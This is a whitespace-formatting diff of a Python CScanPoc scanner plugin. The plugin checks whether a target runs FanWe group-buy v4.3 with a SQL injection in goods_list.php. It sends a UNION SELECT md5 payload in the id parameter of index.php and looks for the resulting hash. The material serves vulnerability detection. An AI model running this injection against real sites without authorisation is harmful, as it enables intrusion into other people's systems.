@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FanWe_0002' # 平台漏洞编号，留空
+    vuln_id = 'FanWe_0002'  # 平台漏洞编号，留空
     name = '方维团购 v4.3 goods_list.php SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-07-11'  # 漏洞公布时间
     desc = '''
         方维团购 v4.3 /app/source/goods_list.php，id造成了注入。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'FanWe(方维)'  # 漏洞应用名称
     product_version = 'v4.3'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '988d9618-8b81-43ac-b9de-d9453cda9fdc'
@@ -31,21 +33,22 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5%28333%29%29%23"
             verify_url = self.target + payload
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
-            
+
             if '310dcbbf4cce62f762a2aaa148d556bd' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
